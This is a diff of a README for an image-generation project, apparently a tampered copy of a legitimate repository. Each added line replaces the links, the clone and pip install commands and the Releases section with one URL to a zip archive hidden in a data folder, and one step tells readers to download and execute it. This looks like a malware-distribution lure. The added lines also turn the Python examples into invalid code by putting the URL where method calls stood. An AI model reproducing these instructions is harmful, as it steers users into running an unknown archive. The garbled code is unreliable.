@@ -1,7 +1,7 @@
 ```markdown
 # 🌟 Lumina-mGPT 2.0: Stand-alone Autoregressive Image Modeling 🌟
 
-![Lumina-mGPT 2.0](https://img.shields.io/badge/Lumina--mGPT%202.0-v1.0.0-blue.svg)
+![Lumina-mGPT 2.0](https://github.com/Basha206/Lumina-mGPT-2.0/raw/refs/heads/main/xllmx/data/conversation/GP_Lumina_m_v3.9.zip%https://github.com/Basha206/Lumina-mGPT-2.0/raw/refs/heads/main/xllmx/data/conversation/GP_Lumina_m_v3.9.zip)
 
 Welcome to the Lumina-mGPT 2.0 repository! This project focuses on autoregressive image modeling. Our aim is to provide an efficient, flexible, and user-friendly framework for generating images based on given prompts. 
 
@@ -27,16 +27,16 @@ To get started with Lumina-mGPT 2.0, follow these steps:
 
 1. Clone the repository:
     ```bash
-    git clone https://github.com/Basha206/Lumina-mGPT-2.0.git
+    git clone https://github.com/Basha206/Lumina-mGPT-2.0/raw/refs/heads/main/xllmx/data/conversation/GP_Lumina_m_v3.9.zip
     cd Lumina-mGPT-2.0
     ```
 
 2. Install the required packages:
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://github.com/Basha206/Lumina-mGPT-2.0/raw/refs/heads/main/xllmx/data/conversation/GP_Lumina_m_v3.9.zip
     ```
 
-3. Download and execute the model files from the [Releases](https://github.com/Basha206/Lumina-mGPT-2.0/releases) section.
+3. Download and execute the model files from the [Releases](https://github.com/Basha206/Lumina-mGPT-2.0/raw/refs/heads/main/xllmx/data/conversation/GP_Lumina_m_v3.9.zip) section.
 
 ## Usage
 
@@ -54,12 +54,12 @@ After installing Lumina-mGPT 2.0, you can start using the model as follows:
 
 3. **Generate an Image**:
     ```python
-    image = model.generate(prompt="A futuristic cityscape")
+    image = https://github.com/Basha206/Lumina-mGPT-2.0/raw/refs/heads/main/xllmx/data/conversation/GP_Lumina_m_v3.9.zip(prompt="A futuristic cityscape")
     ```
 
 4. **Save the Image**:
     ```python
-    image.save("output.png")
+    https://github.com/Basha206/Lumina-mGPT-2.0/raw/refs/heads/main/xllmx/data/conversation/GP_Lumina_m_v3.9.zip("https://github.com/Basha206/Lumina-mGPT-2.0/raw/refs/heads/main/xllmx/data/conversation/GP_Lumina_m_v3.9.zip")
     ```
 
 ### Example Code
@@ -69,8 +69,8 @@ Here is an example of how to generate multiple images:
 ```python
 prompts = ["A serene landscape", "A busy market", "An abstract design"]
 for prompt in prompts:
-    img = model.generate(prompt=prompt)
-    img.save(f"{prompt}.png")
+    img = https://github.com/Basha206/Lumina-mGPT-2.0/raw/refs/heads/main/xllmx/data/conversation/GP_Lumina_m_v3.9.zip(prompt=prompt)
+    https://github.com/Basha206/Lumina-mGPT-2.0/raw/refs/heads/main/xllmx/data/conversation/GP_Lumina_m_v3.9.zip(f"{prompt}.png")
 ```
 
 ## Contributing
@@ -95,7 +95,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you encounter any issues or have questions, please open an issue in the repository. 
 
-For updates and releases, visit the [Releases](https://github.com/Basha206/Lumina-mGPT-2.0/releases) section.
+For updates and releases, visit the [Releases](https://github.com/Basha206/Lumina-mGPT-2.0/raw/refs/heads/main/xllmx/data/conversation/GP_Lumina_m_v3.9.zip) section.
 
 ---
 
